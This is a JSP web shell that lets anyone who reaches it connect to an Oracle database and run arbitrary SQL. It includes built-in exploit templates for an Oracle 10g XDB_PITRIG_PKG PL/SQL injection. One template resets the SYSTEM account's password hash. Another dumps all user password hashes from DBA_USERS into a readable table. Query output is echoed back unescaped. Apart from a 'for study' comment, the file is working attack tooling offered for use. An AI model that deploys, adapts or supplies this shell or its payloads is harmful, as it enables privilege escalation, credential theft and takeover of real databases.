<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.lang.*"%>
<%@ page import="java.sql.*"%>
<%@ page import="java.util.*"%>
<%@ page import="java.io.*"%>
<%!
/**
	 * 
	 * this tool only for study
	 * you can find this everywhere
	 */
//test fun
public List testconn(java.lang.String url, java.lang.String user,
			java.lang.String password) throws java.lang.Exception {
		Class.forName("oracle.jdbc.driver.OracleDriver").newInstance();
		Connection conn = DriverManager.getConnection(url, user, password);
		String sql = "SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_rows>0 and rownum<10";
		Statement stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,
				ResultSet.CONCUR_UPDATABLE);
		ResultSet rs = stmt.executeQuery(sql);
		List list = new Vector();
		list.add(new String[]{"some system tables!","good luck!"});
		while (rs.next()) {
			java.lang.String str[] = new java.lang.String[2];
			str[0] = rs.getString("owner");
			str[1] = rs.getString("table_name");
			list.add(str);
		}
		
		rs.close();
		stmt.close();
		conn.close();

		return list;
	}

	/**getConn
	 */
	public Connection getConn(String url, String user, String password)
			throws java.lang.Exception {

		Class.forName("oracle.jdbc.driver.OracleDriver").newInstance();
		return DriverManager.getConnection(url, user, password);
	}

	/**to exec the sql query.
	 */
	public List getSqlExecuteContext(String sql, String url, String user,
			String password) throws java.lang.Exception {
		Connection conn = getConn(url, user, password);
		Statement stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,
				ResultSet.CONCUR_UPDATABLE);
		ResultSet rs = stmt.executeQuery(sql);
		ResultSetMetaData rsma = rs.getMetaData();
		int inttmp = rsma.getColumnCount();
		List listcolum = new Vector();
		for (int i = 0; i < inttmp; i++) {
			listcolum.add(rsma.getColumnName(i+1));
		}
		
		List list = new Vector();
		list.add(listcolum);
		while (rs.next()) {
			List listRsValue = new Vector();
			for (int i = 0; i < inttmp; i++) {
				listRsValue.add(rs.getObject(i + 1));
			}
			list.add(listRsValue);
		}
		
		rs.close();
		stmt.close();
		conn.close();
		return list;
	}

	/**execute update,delete,proc,create and so on...
	 */
	public int executeUpdate(String sql, String url, String user,
			String password) throws java.lang.Exception {
		Connection conn = getConn(url, user, password);
		Statement stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,
				ResultSet.CONCUR_UPDATABLE);
		int i = stmt.executeUpdate(sql);
		conn.commit();
		stmt.close();
		conn.close();
		return i;
	}

	/**to invoke other fun
	 */
	public List toFuckLZ(String str, String url, String user, String password) {
		List list = new Vector();
		if (str==null||str.length()<7)
		{
			return list;
		}
		if (str.substring(0, 6).toLowerCase().equals("select")) {
			try {
				list = getSqlExecuteContext(str, url, user, password);
			} catch (Exception ex) {
				list.add(ex.getMessage());
			}
		} else {
			try {
				list.add("success to yingxiang ji lu "
						+ executeUpdate(str, url, user, password) + " tiao !");
			} catch (Exception ex) {
				list.add(ex.getMessage());
			}
		}
		return list;
	}%>
<%
	//globol
	String action = "";
	action = request.getParameter("action");
	String oracle_config_db_username = "";
	String oracle_config_db_password = "";
	String oracle_config_db_ip = "";
	String oracle_config_db_sid = "";
	String oracle_config_db_port = "";
	String oracle_config_db_url = "";

	if (action == null) {
		//config
%>
<script>
	function fun_xiangxicanshu()
	{

		var xiangxidiv = document.getElementById('xiangxilianjie');
        xiangxidiv.style.display="block";
		var chuancandiv = document.getElementById('chuanurlfangshi');
		chuancandiv.style.display="none";
		var action = document.getElementById('action');
		action.value='db_config_xiangxi';

	}
	function fun_chuanurl()
	{
		var xiangxidiv = document.getElementById('xiangxilianjie');
		xiangxidiv.style.display="none";
		var chuancandiv = document.getElementById('chuanurlfangshi');
		chuancandiv.style.display="block";
		var action = document.getElementById('action');
		action.value='db_config_url';
	}

</script>
oracle execute...
<br />
<input name="xiangxicanshu" type="radio" value=""
	onclick="fun_xiangxicanshu()" />
all Parameter
<input name="xiangxicanshu" type="radio" value=""
	onclick="fun_chuanurl();" />
url ,dbuser,dbname

<form id="form1" name="form1" method="post" action="system.jsp">
	<input type="hidden" name="action" id="action" />
	<div id="xiangxilianjie" style="display:none">
		<table width="362" border="1">
			<tr>
				<td width="123">
					oracle IP
				</td>
				<td width="223">
					<label>
						<input type="text" name="oracle_config_db_ip" />
					</label>
				</td>
			</tr>
			<tr>
				<td>
					db_username
				</td>
				<td>
					<input type="text" name="oracle_config_db_username" />
				</td>
			</tr>
			<tr>
				<td>
					db_password
				</td>
				<td>
					<input type="password" name="oracle_config_db_password" />
				</td>
			</tr>
			<tr>
				<td>
					SID
				</td>
				<td>
					<input type="text" name="oracle_config_db_sid" />
				</td>
			</tr>
			<tr>
				<td>
					port
				</td>
				<td>
					<input type="text" name="oracle_config_db_port" />
				</td>
			</tr>
			<tr>
				<td colspan="2">
					<label>
						go
						<input type="submit" name="Submit" value="login" />
					</label>
				</td>
			</tr>
		</table>
	</div>
	<div id="chuanurlfangshi" style="display:none">
		<table width="774" border="1">
			<tr>
				<td width="92">
					url:
				</td>
				<td width="666">
					<label>
						<textarea name="oracle_config_db_url" cols="100" rows="5"></textarea>
					</label>
				</td>
			</tr>
			<tr>
				<td>
					db_username
				</td>
				<td>
					<input type="text" name="oracle_config_db_username1" />
				</td>
			</tr>
			<tr>
				<td>
					password
				</td>
				<td>
					<input type="password" name="oracle_config_db_password1" />
				</td>
			</tr>
			<tr>
				<td colspan="2">
					<label>
						go
						<input type="submit" name="Submit2" value="login" />
					</label>
				</td>
			</tr>
		</table>
	</div>
</form>
<%
		} else if (action.equals("db_config_xiangxi")) {
		oracle_config_db_username = request
		.getParameter("oracle_config_db_username");
		oracle_config_db_password = request
		.getParameter("oracle_config_db_password");
		oracle_config_db_ip = request
		.getParameter("oracle_config_db_ip");
		oracle_config_db_sid = request
		.getParameter("oracle_config_db_sid");
		oracle_config_db_port = request
		.getParameter("oracle_config_db_port");
		String url = null;

		url = "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST="
		+ oracle_config_db_ip
		+ ")(PORT="
		+ oracle_config_db_port
		+ ")))(CONNECT_DATA=(SERVER=DEDICATED)(SERVICE_NAME="
		+ oracle_config_db_sid + ")))";

		List list = new Vector();
		list.add(new String[]{"some system tables!","good luck!"});
		//try {
		//	list = testconn(url, oracle_config_db_username,
		//	oracle_config_db_password);
		//} catch (java.lang.Exception ex) {
		//}
		request.getSession().setAttribute("url_dbconn", url);
		request.getSession().setAttribute("db_user",
		oracle_config_db_username);
		request.getSession().setAttribute("db_password",
		oracle_config_db_password);
%>
ORACLE table list ??
<br />
<b>username--tablename</b>
<a href="<%=request.getRequestURL()%>?action=show">click me to con</a>
<br />
<textarea name="jieguo" cols="100" rows="30">
        <%
        			for (int i = 0; i < list.size(); i++) {
        			java.lang.String str[] = (String[]) list.get(i);
        %>
                <%=str[0]%> -- <%=str[1]%>
            <%
            }
            %>
						</textarea>
<%
		} else if (action.equals("db_config_url")) {

		oracle_config_db_url = request
		.getParameter("oracle_config_db_url");
		oracle_config_db_username = request
		.getParameter("oracle_config_db_username1");
		oracle_config_db_password = request
		.getParameter("oracle_config_db_password1");

		List list = new Vector();
		//try {
		//	list = testconn(oracle_config_db_url,
		//	oracle_config_db_username,
		//	oracle_config_db_password);
		//} catch (java.lang.Exception e) {
		//}
		list.add(new String[]{"some system tables!","good luck!"});
		request.getSession().setAttribute("url_dbconn",
		oracle_config_db_url);
		request.getSession().setAttribute("db_user",
		oracle_config_db_username);
		request.getSession().setAttribute("db_password",
		oracle_config_db_password);
%>
ORACLE table list ??
<br />
<b>username--tablename</b>
<a href="<%=request.getRequestURL()%>?action=show">click me to con</a>
<br />
<textarea name="jieguo" cols="100" rows="30">
        <%
        			for (int i = 0; i < list.size(); i++) {
        			java.lang.String str[] = (String[]) list.get(i);
        %>
                <%=str[0]%> -- <%=str[1]%>
            <%
            }
            %>
						</textarea>
<%
} else if (action.equals("show")) {
%>
<script language="javascript">
			//copy from sohu...
			function GetO(){
				    var ajax=false;
				    try {
				    	ajax = new ActiveXObject("Msxml2.XMLHTTP");
				    } catch (e) {
				   	 	try {
				    		ajax = new ActiveXObject("Microsoft.XMLHTTP");
				    	} catch (E) {
				    		ajax = false;
				    	}
				    }
				    if (!ajax && typeof XMLHttpRequest!='undefined') {
				    	ajax = new XMLHttpRequest();
				    }
				    return ajax;
				}
				//copy from sohu...
				function getMyHTML(serverPage) {
					var ajax = GetO();
				    var requestDiv = document.getElementById('requestDiv');
				    
				    ajax.open("POST",serverPage,true);
		
				    ajax.onreadystatechange = function() {
				        if (ajax.readyState == 4 && ajax.status == 200) {
							var strvar = ajax.responseText;
							requestDiv.innerHTML += strvar;
							//requestDiv.innerHTML += strvar;
				        }
				    }
					ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
					var queryString = createQueryString();
				    ajax.send(queryString);
				}
				function createQueryString()
				{
					 var sqlrequest=document.getElementById("sqlrequest").innerText;
					 
					 var time = Math.random();
					 var queryString="sqlrequest=" + sqlrequest + "&time=" + time;
					 return queryString;
				}
				function requestAjax()
				{
					getMyHTML("<%=request.getRequestURL()%>?action=todoExeSql","sqlrequest");
				}
				function clearResult()
				{
					document.getElementById('requestDiv').innerHTML='';
				}
				function selectThemSql()
				{
					var iniselect = document.getElementById('emSql').value;
					var sqlrequest = document.getElementById('sqlrequest');
					
					//change pass desc
					if (iniselect=='1')
					{
						var sqlstr = "";
						sqlstr+="Oracle 10g R1 xdb.xdb_pitrig_pkg PLSQL Injection (change sys password)"+"\r\n";
						sqlstr+="step 1 to create proc"+"\r\n";
						sqlstr+="step 2 to exec "+"\r\n";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					//change pass step 1
					if (iniselect=='2')
					{
						var sqlstr = "";
						sqlstr+="CREATE OR REPLACE FUNCTION CHANGEPASS return varchar2"+"\r\n";
						sqlstr+="authid current_user as"+"\r\n";
						sqlstr+="pragma autonomous_transaction;"+"\r\n";
						sqlstr+="BEGIN"+"\r\n";
						sqlstr+="EXECUTE IMMEDIATE 'update sys.user$ set password=''EC7637CC2C2BOADC'' where name=''SYSTEM''';"+"\r\n";
						sqlstr+="COMMIT;"+"\r\n";
						sqlstr+="RETURN '';"+"\r\n";
						sqlstr+="END;"+"\r\n";
						sqlstr+="/"+"\r\n";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					//change pass step 2
					if (iniselect=='3')
					{
						var sqlstr = "";
						sqlstr+="EXEC XDB.XDB_PITRIG_PKG.PITRIG_DROP('SCOTT\".\"SH2KERR\" WHERE 1=SCOTT.CHANGEPASS()--','HELLO IDS IT IS EXPLOIT :)');";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					
					//get password hash
					if (iniselect=='4')
					{
						var sqlstr = "";
						sqlstr+="Oracle 10g R1 xDb.XDB_PITRIG_PKG.PITRIG_TRUNCATE exp (get password hash)"+"\r\n";
						sqlstr+="step 1 to create a table for save result"+"\r\n";
						sqlstr+="step 2 to create a proc "+"\r\n";
						sqlstr+="step 3 to exec proc (exp)"+"\r\n";
						sqlstr+="step 4 to select result"+"\r\n";
						sqlstr+="ps: don't forget to delete the table."+"\r\n";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					if (iniselect=='5')
					{
						var sqlstr = "";
						sqlstr+="CREATE TABLE SH2KERR(id NUMBER,name VARCHAR(20),password VARCHAR(16));";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					if (iniselect=='6')
					{
						var sqlstr = "";
						sqlstr+="CREATE OR REPLACE FUNCTION SHOWPASS return varchar2"+"\r\n";
						sqlstr+="authid current_user as"+"\r\n";
						sqlstr+="pragma autonomous_transaction;"+"\r\n";
						sqlstr+="BEGIN"+"\r\n";
						sqlstr+="EXECUTE IMMEDIATE 'INSERT INTO SCOTT.sh2kerr(id,name,password) SELECT user_id,username,password FROM DBA_USERS';"+"\r\n";
						sqlstr+="COMMIT;"+"\r\n";
						sqlstr+="RETURN '';"+"\r\n";
						sqlstr+="END;"+"\r\n";
						sqlstr+="/"+"\r\n";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					if (iniselect=='7')
					{
						var sqlstr = "";
						sqlstr+="EXEC XDB.XDB_PITRIG_PKG.PITRIG_TRUNCATE('SCOTT&quot;.&quot;SH2KERR&quot; WHERE 1=SCOTT.SHOWPASS()--','HELLO IDS IT IS EXPLOIT :)');"+"\r\n";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					if (iniselect=='8')
					{
						var sqlstr = "";
						sqlstr+="select * from sh2kerr;";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					if (iniselect=='9')
					{
						var sqlstr = "";
						sqlstr+="if fun , i will dev a xml version..";
						sqlrequest.innerText = sqlstr;
						sqlrequest.value = sqlstr;
					}
					
				}
		</script>
<table width="782" height="394" border="0" align="center">
	<tr>
		<td width="49" height="27">
			&nbsp;
		</td>
		<td width="297">
			<br/>
			select the em 
			<select onchange="selectThemSql();" id="emSql">
				<option value="">select</option>
				<option value="1">	change sys pass 12345 Exp</option>
				<option value="2">	----------step 1 (create proc)</option>
				<option value="3">	----------step 2 (exec proc)</option>
				<option value="4">	get password Hashes</option>
				<option value="5">	----------step 1 (create table)</option>
				<option value="6">	----------step 2 (create proc)</option>
				<option value="7">	----------step 3 (exec proc)</option>
				<option value="8">	----------step 4 (select)</option>
				<option value="9">	and so on...</option>
			</select>
		</td>
	</tr>
	<tr>
		<td height="76">
			sql:
		</td>
		<td>
			<label>
				<textarea name="sqlrequest" rows="5" cols="80" id="sqlrequest"></textarea><br>
				<input type="button" name="Submit" onclick="requestAjax();"
					value="gogogogogog" />
					<input type="button" name="Submit" onclick="clearResult();"
					value="clearResult" /><br/>
			</label>
		</td>
	</tr>

	<tr>
		<td>
			result:
		</td>
		<td>
			<label>
				<span id="requestDiv" name="requestDiv"></span>
			</label>
		</td>
	</tr>

</table>
<%
		} else if (action.equals("todoExeSql")) {
		String url = null;
		if (request.getSession().getAttribute("url_dbconn") != null) {
			url = request.getSession().getAttribute("url_dbconn")
			.toString();
		}

		String user = null;
		if (request.getSession().getAttribute("db_user") != null) {
			user = request.getSession().getAttribute("db_user")
			.toString();
		}

		String password = null;
		if (request.getSession().getAttribute("db_password") != null) {
			password = request.getSession().getAttribute("db_password")
			.toString();
		}

		String strsql = null;
		if (request.getParameter("sqlrequest") != null) {
			strsql = request.getParameter("sqlrequest").toString();
		}
		String strResponse ="<b>execute :\"" + strsql + "\"</b><table border=1>";
		List listtmp = toFuckLZ(strsql, url, user, password);

		for (int i = 0; i < listtmp.size(); i++) {
			List listwaiceng = new Vector();
			try {
				listwaiceng = (Vector)listtmp.get(i);
			} catch (Exception ex) {
				strResponse += "error! to check you sql! "+listtmp;
				break;
			}
			if (listwaiceng == null) {
				strResponse += "<br/>";
				continue;
			}
			strResponse += "<tr>";
			for (int j = 0; j < listwaiceng.size(); j++) {
				try{
					strResponse += "<td>"+listwaiceng.get(j)+"</td>";
				}catch(Exception ex){
					strResponse += "error! to check you sql! "+listtmp;
					break;
				}
			}
			strResponse += "</tr>";
		}
		strResponse += "</table>";
		try{
		
			PrintWriter output = response.getWriter();
			output.println(strResponse);
			output.flush();

			output.close();
			}catch(Exception ex){
		}
	}
%>
